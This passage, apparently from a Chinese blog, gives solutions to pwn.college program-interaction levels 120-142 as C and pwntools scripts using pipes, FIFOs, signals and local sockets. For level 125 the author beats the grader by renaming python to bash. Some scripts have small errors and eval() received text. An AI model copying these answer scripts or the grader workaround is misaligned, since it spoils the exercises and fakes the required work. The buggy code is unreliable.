class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (dup2(fd, 0) &lt; 0) &#123;  // 重定向 stdin</span><br><span class="line">        perror(&quot;dup2 stdin&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (dup2(fd2, 1) &lt; 0) &#123;  // 重定向 stdout</span><br><span class="line">        perror(&quot;dup2 stdout&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (execve(&quot;/challenge/run&quot;, argv, env) == -1) &#123;</span><br><span class="line">        perror(&quot;execve failed&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[], char *env[]) &#123;</span><br><span class="line">    if (mkfifo(&quot;/tmp/fifo&quot;, 0666) &lt; 0 &amp;&amp; errno != EEXIST) &#123;</span><br><span class="line">        perror(&quot;mkfifo /tmp/fifo&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (mkfifo(&quot;/tmp/fifo2&quot;, 0666) &lt; 0 &amp;&amp; errno != EEXIST) &#123;</span><br><span class="line">        perror(&quot;mkfifo /tmp/fifo2&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pid_t fpid = fork();</span><br><span class="line">    if (fpid &lt; 0) &#123;</span><br><span class="line">        perror(&quot;fork&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125; else if (fpid == 0) &#123;</span><br><span class="line">        pwncollege(argv, env);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        int fd = open(&quot;/tmp/fifo&quot;, O_WRONLY);</span><br><span class="line">        if (fd &lt; 0) &#123;</span><br><span class="line">            perror(&quot;open /tmp/fifo for writing&quot;);</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int fd2 = open(&quot;/tmp/fifo2&quot;, O_RDONLY);</span><br><span class="line">        if (fd2 &lt; 0) &#123;</span><br><span class="line">            perror(&quot;open /tmp/fifo2 for reading&quot;);</span><br><span class="line">            close(fd);</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        wait(NULL); // 等待子进程结束</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        close(fd2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level-120-122"><a href="#level-120-122" class="headerlink" title="level 120-122"></a>level 120-122</h1><p>这些关卡均要求从特定文件描述符获取输入</p>
<p>存在通解，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dup2(0,fd);</span><br></pre></td></tr></table></figure>

<p>将fd复制给0，即可通过标准输入来输入密码</p>
<h1 id="level-123"><a href="#level-123" class="headerlink" title="level 123"></a>level 123</h1><p>另起一个终端使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -s SIGNAL PID</span><br></pre></td></tr></table></figure>

<p>即可</p>
<h1 id="level-124"><a href="#level-124" class="headerlink" title="level 124"></a>level 124</h1><p>关卡要求输入多个信号</p>
<p>使用kill仍可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">PID=2668</span><br><span class="line">kill -SIGHUP $PID</span><br><span class="line">sleep 1</span><br><span class="line">kill -SIGABRT $PID</span><br><span class="line">sleep 1</span><br><span class="line"></span><br><span class="line">kill -SIGABRT $PID</span><br><span class="line">sleep 1</span><br><span class="line"></span><br><span class="line">kill -SIGINT $PID</span><br><span class="line">sleep 1</span><br><span class="line"></span><br><span class="line">kill -SIGUSR1 $PID</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level-125-x2F-126"><a href="#level-125-x2F-126" class="headerlink" title="level 125&#x2F;126"></a>level 125&#x2F;126</h1><p>本关要求使用shell脚本解决算术问题</p>
<p>正常方法试了不少，但都过不去，于是走点歪门邪道</p>
<p>检查文件只要求我们使用的是 <code> bash ./xxx.sh</code>直接把python改名成bash，然后直接pwntools直接秒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;/challenge/run&quot;)</span><br><span class="line">for i in range(50):</span><br><span class="line">    #print(p.recvline())</span><br><span class="line">    print(p.recvuntil(&quot;for: &quot;))</span><br><span class="line">    s=p.recvline()</span><br><span class="line">    print(s)</span><br><span class="line">    tmp=eval(s)</span><br><span class="line">    print(tmp)</span><br><span class="line">    p.sendline(b&quot;%d&quot;%tmp)</span><br><span class="line">print(p.recvall())</span><br></pre></td></tr></table></figure>

<p>126也可以这么写，126要求运算500次，跑就完了</p>
<h1 id="level-127-x2F-128"><a href="#level-127-x2F-128" class="headerlink" title="level 127&#x2F;128"></a>level 127&#x2F;128</h1><p>要求发送50个signals</p>
<p>同样使用无敌的pwntools</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">sh=process(&quot;/challenge/run&quot;)</span><br><span class="line">#print(sh.recvline())</span><br><span class="line">#print(sh.recvline())</span><br><span class="line">sh.recvuntil(b&quot;(PID &quot;)</span><br><span class="line">pid=int(sh.recvuntil(b&quot;)&quot;)[:-1])</span><br><span class="line">print(&quot;该程序的pid为%d&quot;%pid)</span><br><span class="line">sh.recvuntil(b&quot;: [&quot;)</span><br><span class="line">s=sh.recvuntil(b&quot;]&quot;,drop=True)</span><br><span class="line">print(&quot;信号序列为&quot;)</span><br><span class="line">print(s)</span><br><span class="line">str=s.decode(&quot;utf-8&quot;)</span><br><span class="line">a = [s.strip().strip(&quot;&#x27;&quot;) for s in str.split(&quot;,&quot;)]</span><br><span class="line">print(a)  </span><br><span class="line">for i in range(len(a)):</span><br><span class="line">    print(&quot;正在发送信号：%d&quot; % i)</span><br><span class="line">    print(pid, eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    #os.kill(pid, eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    sh.send_signal(eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    sh.recvuntil(&quot;Correct!\n&quot;)</span><br><span class="line"></span><br><span class="line">print(sh.recvall())</span><br></pre></td></tr></table></figure>

<p>使用pwntools自带的signal可以，使用os.kill也可以</p>
<h1 id="level-129"><a href="#level-129" class="headerlink" title="level 129"></a>level 129</h1><p>关卡要求使用shell脚本，stdin和stdout的另一端均为cat</p>
<p>解决50个算术问题</p>
<p>使用无敌的pwntools</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"># 创建两个管道</span><br><span class="line">read_pipe_in, write_pipe_in = os.pipe()  # 用于 cat -&gt; 程序</span><br><span class="line">read_pipe_out, write_pipe_ `1`out = os.pipe()  # 用于 程序 -&gt; cat</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输入数据</span><br><span class="line">cat_in = process([&#x27;/usr/bin/cat&#x27;], stdout=write_pipe_in)</span><br><span class="line"></span><br><span class="line"># 启动目标程序，并将其 stdin 和 stdout 分别重定向到管道</span><br><span class="line">p = process(&#x27;/challenge/run&#x27;, stdin=read_pipe_in, stdout=write_pipe_out)</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输出结果</span><br><span class="line">cat_out = process([&#x27;/usr/bin/cat&#x27;], stdin=read_pipe_out)</span><br><span class="line"></span><br><span class="line"># 输入一些数据到第一个 cat</span><br><span class="line"></span><br><span class="line"># 从第二个 cat 读取程序的输出</span><br><span class="line">for i in range(50):</span><br><span class="line">    cat_out.recvuntil(&quot;solution for: &quot;)</span><br><span class="line">    s=cat_out.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">    cat_in.sendline(str(eval(s)))# 打印输出结果</span><br><span class="line">print(cat_out.recvall(timeout=1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="level-130"><a href="#level-130" class="headerlink" title="level 130"></a>level 130</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"># 创建两个管道</span><br><span class="line">read_pipe_in, write_pipe_in = os.pipe()  # 用于 cat -&gt; 程序</span><br><span class="line">read_pipe_out, write_pipe_out = os.pipe()  # 用于 程序 -&gt; cat</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输入数据</span><br><span class="line">cat_in = process([&#x27;/usr/bin/cat&#x27;], stdout=write_pipe_in)</span><br><span class="line"></span><br><span class="line"># 启动目标程序，并将其 stdin 和 stdout 分别重定向到管道</span><br><span class="line">p = process(&#x27;/challenge/run&#x27;, stdin=read_pipe_in, stdout=write_pipe_out)</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输出结果</span><br><span class="line">cat_out = process([&#x27;/usr/bin/cat&#x27;], stdin=read_pipe_out)</span><br><span class="line"></span><br><span class="line"># 输入一些数据到第一个 cat</span><br><span class="line"># 从第二个 cat 读取程序的输出</span><br><span class="line">for i in range(50):</span><br><span class="line">    cat_out.recvuntil(&quot;solution for: &quot;)</span><br><span class="line">    s=cat_out.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">    cat_in.sendline(str(eval(s)))# 打印输出结果</span><br><span class="line">print(cat_out.recvall(timeout=1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="level-131"><a href="#level-131" class="headerlink" title="level 131"></a>level 131</h1><p>500次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"># 创建两个管道</span><br><span class="line">read_pipe_in, write_pipe_in = os.pipe()  # 用于 cat -&gt; 程序</span><br><span class="line">read_pipe_out, write_pipe_out = os.pipe()  # 用于 程序 -&gt; cat</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输入数据</span><br><span class="line">cat_in = process([&#x27;/usr/bin/cat&#x27;], stdout=write_pipe_in)</span><br><span class="line"></span><br><span class="line"># 启动目标程序，并将其 stdin 和 stdout 分别重定向到管道</span><br><span class="line">p = process(&#x27;/challenge/run&#x27;, stdin=read_pipe_in, stdout=write_pipe_out)</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输出结果</span><br><span class="line">cat_out = process([&#x27;/usr/bin/cat&#x27;], stdin=read_pipe_out)</span><br><span class="line"></span><br><span class="line"># 输入一些数据到第一个 cat</span><br><span class="line"># 从第二个 cat 读取程序的输出</span><br><span class="line">for i in range(500):</span><br><span class="line">    cat_out.recvuntil(&quot;solution for: &quot;)</span><br><span class="line">    s=cat_out.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">    cat_in.sendline(str(eval(s)))# 打印输出结果</span><br><span class="line">print(cat_out.recvall(timeout=1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="level-132-x2F-133"><a href="#level-132-x2F-133" class="headerlink" title="level 132&#x2F;133"></a>level 132&#x2F;133</h1><p>50个和500个信号，上面已经有了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">sh=process(&quot;/challenge/run&quot;)</span><br><span class="line">#print(sh.recvline())</span><br><span class="line">#print(sh.recvline())</span><br><span class="line">sh.recvuntil(b&quot;(PID &quot;)</span><br><span class="line">pid=int(sh.recvuntil(b&quot;)&quot;)[:-1])</span><br><span class="line">print(&quot;该程序的pid为%d&quot;%pid)</span><br><span class="line">sh.recvuntil(b&quot;: [&quot;)</span><br><span class="line">s=sh.recvuntil(b&quot;]&quot;,drop=True)</span><br><span class="line">print(&quot;信号序列为&quot;)</span><br><span class="line">print(s)</span><br><span class="line">str=s.decode(&quot;utf-8&quot;)</span><br><span class="line">a = [s.strip().strip(&quot;&#x27;&quot;) for s in str.split(&quot;,&quot;)]</span><br><span class="line">print(a)  </span><br><span class="line">for i in range(len(a)):</span><br><span class="line">    print(&quot;正在发送信号：%d&quot; % i)</span><br><span class="line">    print(pid, eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    #os.kill(pid, eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    sh.send_signal(eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    sh.recvuntil(&quot;Correct!\n&quot;)</span><br><span class="line"></span><br><span class="line">print(sh.recvall())</span><br></pre></td></tr></table></figure>



<h1 id="level-134"><a href="#level-134" class="headerlink" title="level 134"></a>level 134</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"># 创建两个管道</span><br><span class="line">read_pipe_in, write_pipe_in = os.pipe()  # 用于 cat -&gt; 程序</span><br><span class="line">read_pipe_out, write_pipe_out = os.pipe()  # 用于 程序 -&gt; cat</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输入数据</span><br><span class="line">cat_in = process([&#x27;/usr/bin/cat&#x27;], stdout=write_pipe_in)</span><br><span class="line"></span><br><span class="line"># 启动目标程序，并将其 stdin 和 stdout 分别重定向到管道</span><br><span class="line">p = process(&#x27;/challenge/run&#x27;, stdin=read_pipe_in, stdout=write_pipe_out)</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输出结果</span><br><span class="line">cat_out = process([&#x27;/usr/bin/cat&#x27;], stdin=read_pipe_out)</span><br><span class="line"></span><br><span class="line"># 输入一些数据到第一个 cat</span><br><span class="line"># 从第二个 cat 读取程序的输出</span><br><span class="line">for i in range(50):</span><br><span class="line">    cat_out.recvuntil(&quot;solution for: &quot;)</span><br><span class="line">    s=cat_out.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">    cat_in.sendline(str(eval(s)))# 打印输出结果</span><br><span class="line">print(cat_out.recvall(timeout=1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="level-135"><a href="#level-135" class="headerlink" title="level 135"></a>level 135</h1><p>要求使用c写一个计算50个算术的</p>
<p>无所谓，pwntools</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./a.out&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(50):</span><br><span class="line">    p.recvuntil(&quot;solution for: &quot;)</span><br><span class="line">    s=p.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">    p.sendline(str(eval(s)))# 打印输出结果</span><br><span class="line">print(p.recvall(timeout=1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void pwncollege(char *argv[], char *env[]) &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    if (execve(&quot;/challenge/run&quot;, argv, env) == -1) &#123;</span><br><span class="line">        perror(&quot;execve failed&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[], char *env[]) &#123;</span><br><span class="line">    </span><br><span class="line">    // 创建子进程</span><br><span class="line">    pid_t fpid = fork();</span><br><span class="line">    if (fpid &lt; 0) &#123;</span><br><span class="line">        perror(&quot;fork failed&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125; else if (fpid == 0) &#123; </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        pwncollege(argv, env);</span><br><span class="line">    &#125; else &#123; // 父进程</span><br><span class="line">        </span><br><span class="line">        // 等待子进程结束</span><br><span class="line">        wait(NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="level-136"><a href="#level-136" class="headerlink" title="level 136"></a>level 136</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./a.out&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(500):</span><br><span class="line">    p.recvuntil(&quot;solution for: &quot;)</span><br><span class="line">    s=p.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">    p.sendline(str(eval(s)))# 打印输出结果</span><br><span class="line">print(p.recvall(timeout=1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level-137-x2F-138"><a href="#level-137-x2F-138" class="headerlink" title="level 137&#x2F;138"></a>level 137&#x2F;138</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line">p=process(&quot;./a.out&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;(PID &quot;)</span><br><span class="line">pid=int(p.recvuntil(b&quot;)&quot;)[:-1])</span><br><span class="line">print(&quot;该程序的pid为%d&quot;%pid)</span><br><span class="line">p.recvuntil(b&quot;: [&quot;)</span><br><span class="line">s=p.recvuntil(b&quot;]&quot;,drop=True)</span><br><span class="line">print(&quot;信号序列为&quot;)</span><br><span class="line">print(s)</span><br><span class="line">str=s.decode(&quot;utf-8&quot;)</span><br><span class="line">a = [s.strip().strip(&quot;&#x27;&quot;) for s in str.split(&quot;,&quot;)]</span><br><span class="line">print(a)  </span><br><span class="line">for i in range(len(a)):</span><br><span class="line">    print(&quot;正在发送信号：%d&quot; % i)</span><br><span class="line">    print(pid, eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    os.kill(pid, eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    #p.send_signal(eval(&quot;signal.&quot; + a[i]))</span><br><span class="line">    p.recvuntil(&quot;Correct!\n&quot;)    </span><br><span class="line">    </span><br><span class="line">print(p.recvall(timeout=1))</span><br></pre></td></tr></table></figure>



<p>使用os可以，但pwntools自带的好像不行，</p>
<h1 id="level-139"><a href="#level-139" class="headerlink" title="level 139"></a>level 139</h1><p>参考：<a href="https://zeredy879.github.io/2023/10/02/pwncollege-program-interaction/">我是如何被pwn.college的program-interaction level139折磨一周的 | Mirror of Glory (zeredy879.github.io)</a></p>
<p>我也被那个<code> [FAIL] Executable must be ‘cat’. Yours is: python3.8</code>卡了半天，后来看了博客知道，只需关闭管道即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"># 创建两个管道</span><br><span class="line">read_pipe_in, write_pipe_in = os.pipe()  # 用于 cat -&gt; 程序</span><br><span class="line">read_pipe_out, write_pipe_out = os.pipe()  # 用于 程序 -&gt; cat</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输入数据</span><br><span class="line">cat_in = process([&#x27;/usr/bin/cat&#x27;], stdout=write_pipe_in)</span><br><span class="line"></span><br><span class="line"># 启动目标程序，并将其 stdin 和 stdout 分别重定向到管道</span><br><span class="line">p = process(&#x27;./a.out&#x27;, stdin=read_pipe_in, stdout=write_pipe_out)</span><br><span class="line"></span><br><span class="line"># 启动 cat 进程，用于输出结果</span><br><span class="line">cat_out = process([&#x27;/usr/bin/cat&#x27;], stdin=read_pipe_out)</span><br><span class="line">os.close(read_pipe_in)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.close(read_pipe_out)</span><br><span class="line"></span><br><span class="line">os.close(write_pipe_out)</span><br><span class="line">os.close(write_pipe_in)</span><br><span class="line"># 输入一些数据到第一个 cat</span><br><span class="line"># 从第二个 cat 读取程序的输出</span><br><span class="line">for i in range(50):</span><br><span class="line">    cat_out.recvuntil(&quot;solution for: &quot;)</span><br><span class="line">    s=cat_out.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">    cat_in.sendline(str(eval(s)))# 打印输出结果</span><br><span class="line">print(cat_out.recvall(timeout=1))</span><br><span class="line">           </span><br></pre></td></tr></table></figure>



<h1 id="level-140-x2F-141"><a href="#level-140-x2F-141" class="headerlink" title="level 140&#x2F;141"></a>level 140&#x2F;141</h1><p>开启一个端口，要求通过tcp端口与挑战交互</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line"># 定义服务器地址和端口</span><br><span class="line">SERVER = &quot;127.0.0.1&quot;  # 替换为实际服务器IP地址</span><br><span class="line">PORT = 1448</span><br><span class="line"></span><br><span class="line">def extract_expression(data):</span><br><span class="line"></span><br><span class="line">    for line in data.splitlines():</span><br><span class="line">        if &#x27;Please send the solution for:&#x27; in line:</span><br><span class="line">            expression = line.split(&#x27;:&#x27;)[-1].strip()</span><br><span class="line">            return expression</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">        s.connect((SERVER, PORT))</span><br><span class="line">        print(f&quot;Connected to &#123;SERVER&#125;:&#123;PORT&#125;&quot;)</span><br><span class="line">        while True:</span><br><span class="line">            data = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            if not data:</span><br><span class="line">                break</span><br><span class="line">            print(data)</span><br><span class="line">            expression = extract_expression(data)</span><br><span class="line">            if expression:</span><br><span class="line">                try:</span><br><span class="line">                    result = eval(expression)</span><br><span class="line">                    s.sendall(str(result).encode()+b&quot;\n&quot;)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    print(f&quot;Error evaluating expression: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这里简单写了个交互程序，发送数据的时候不加”\n”的话，挑战不会输入</p>
<h1 id="level-142"><a href="#level-142" class="headerlink" title="level 142"></a>level 142</h1><p>用c网络编程，用了toka神的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#define SERVER_IP &quot;0.0.0.0&quot;</span><br><span class="line">#define SERVER_PORT 1424.</span><br><span class="line">#define BUFFER_SIZE 1024</span><br><span class="line">int pwncollege();</span><br><span class="line">int main()&#123;</span><br><span class="line">    pwncollege();</span><br><span class="line">&#125;</span><br><span class="line">int pwncollege()&#123;</span><br><span class="line">    int sockfd;</span><br><span class="line">    struct sockaddr_in server_addr;</span><br><span class="line">    char buffer[BUFFER_SIZE];</span><br><span class="line">    char ans[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, 0);  // Create a socket</span><br><span class="line">    if(sockfd &lt; 0)&#123;</span><br><span class="line">        perror(&quot;[-]Error in socket&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    server_addr.sin_family = AF_INET; </span><br><span class="line">    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);</span><br><span class="line">    server_addr.sin_port = htons(SERVER_PORT);</span><br><span class="line">    // 连接到服务器</span><br><span class="line">    if (connect(sockfd, (struct sockaddr *)&amp;server_addr, sizeof(server_addr)) == -1) &#123;</span><br><span class="line">        perror(&quot;connect&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        memset(buffer, 0, BUFFER_SIZE);</span><br><span class="line">        if(recv(sockfd, buffer, BUFFER_SIZE, 0) == -1)&#123;</span><br><span class="line">            perror(&quot;recv&quot;);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        printf(&quot;%s&quot;, buffer);</span><br><span class="line">        if(buffer&gt;0)&#123;</span><br><span class="line">            if(!memcmp(&quot;[TEST] CHALLENGE! Please send the solution for: &quot;,buffer,strlen(&quot;[TEST] CHALLENGE! Please send the solution for: &quot;)))&#123;</span><br><span class="line">                memset(ans,0,BUFFER_SIZE);</span><br><span class="line">                read(0,ans,BUFFER_SIZE);</span><br><span class="line">                if(send(sockfd,ans,strlen(ans),0)&lt;0)&#123;</span><br><span class="line">                    perror(&quot;send&quot;);</span><br><span class="line">                    exit(EXIT_FAILURE);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>学到了很多</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwn-college</tag>
      </tags>
  </entry>
  <entry>
    <title>debugging-refresher</title>
    <url>/2024/10/18/pwn-college-debugging-refresher/</url>
    <content><![CDATA[<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can examine the contents of memory using the `x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt;` parameterized command. In this format `&lt;u&gt;` is</span><br><span class="line">the unit size to display, `&lt;f&gt;` is the format to display it in, and `&lt;n&gt;` is the number of elements to display. Valid</span><br><span class="line">unit sizes are `b` (1 byte), `h` (2 bytes), `w` (4 bytes), and `g` (8 bytes). Valid formats are `d` (decimal), `x`</span><br><span class="line">(hexadecimal), `s` (string) and `i` (instruction). The address can be specified using a register name, symbol name, or</span><br><span class="line">absolute address. Additionally, you can supply mathematical expressions when specifying the address.</span><br><span class="line"></span><br><span class="line">For example, `x/8i $rip` will print the next 8 instructions from the current instruction pointer. `x/16i main` will</span><br><span class="line">print the first 16 instructions of main. You can also use `disassemble main`, or `disas main` for short, to print all of</span><br><span class="line">the instructions of main. Alternatively, `x/16gx $rsp` will print the first 16 values on the stack. `x/gx $rbp-0x32`</span><br><span class="line">will print the local variable stored there on the stack.</span><br><span class="line"></span><br><span class="line">You will probably want to view your instructions using the CORRECT assembly syntax. You can do that with the command</span><br><span class="line">`set disassembly-flavor intel`.</span><br><span class="line"></span><br><span class="line">In order to solve this level, you must figure out the random value on the stack (the value read in from `/dev/urandom`).</span><br><span class="line">Think about what the arguments to the read system call are.</span><br></pre></td></tr></table></figure>

<p>找到从&#x2F;dev&#x2F;urandom读入的随机数</p>
<p>首先用<code>layout regs</code> 查看反编译代码和寄存器，找到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	0x6424531acc2c &lt;main+390&gt;       mov    $0x0,%esi                                                                                                               │</span><br><span class="line">│   0x6424531acc31 &lt;main+395&gt;       lea    0xbd5(%rip),%rdi        # 0x6424531ad80d                                                                                │</span><br><span class="line">│   0x6424531acc38 &lt;main+402&gt;       mov    $0x0,%eax                                                                                                               │</span><br><span class="line">│   0x6424531acc3d &lt;main+407&gt;       callq  0x6424531ac250 &lt;open@plt&gt;                                                                                               │</span><br><span class="line">│   0x6424531acc42 &lt;main+412&gt;       mov    %eax,%ecx                                                                                                               │</span><br><span class="line">│   0x6424531acc44 &lt;main+414&gt;       lea    -0x18(%rbp),%rax                                                                                                        │</span><br><span class="line">│   0x6424531acc48 &lt;main+418&gt;       mov    $0x8,%edx                                                                                                               │</span><br><span class="line">│   0x6424531acc4d &lt;main+423&gt;       mov    %rax,%rsi                                                                                                               │</span><br><span class="line">│   0x6424531acc50 &lt;main+426&gt;       mov    %ecx,%edi                                                                                                               │</span><br><span class="line">│   0x6424531acc52 &lt;main+428&gt;       callq  0x6424531ac210 &lt;read@plt&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt; ssize_t read(int fd, void *buf, size_t count)</span><br></pre></td></tr></table></figure>

<p>从打开文件读入0x8大小到rbp-0x18</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x /20gx $rbp-0x18</span><br></pre></td></tr></table></figure>



<h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A critical part of dynamic analysis is getting your program to the state you are interested in analyzing. So far, these</span><br><span class="line">challenges have automatically set breakpoints for you to pause execution at states you may be interested in analyzing.</span><br><span class="line">It is important to be able to do this yourself.</span><br><span class="line"></span><br><span class="line">There are a number of ways to move forward in the program&#x27;s execution. You can use the `stepi &lt;n&gt;` command, or `si &lt;n&gt;`</span><br><span class="line">for short, in order to step forward one instruction. You can use the `nexti &lt;n&gt;` command, or `ni &lt;n&gt;` for short, in</span><br><span class="line">order to step forward one instruction, while stepping over any function calls. The `&lt;n&gt;` parameter is optional, but</span><br><span class="line">allows you to perform multiple steps at once. You can use the `finish` command in order to finish the currently</span><br><span class="line">executing function. You can use the `break *&lt;address&gt;` parameterized command in order to set a breakpoint at the</span><br><span class="line">specified-address. You have already used the `continue` command, which will continue execution until the program hits a</span><br><span class="line">breakpoint.</span><br><span class="line"></span><br><span class="line">While stepping through a program, you may find it useful to have some 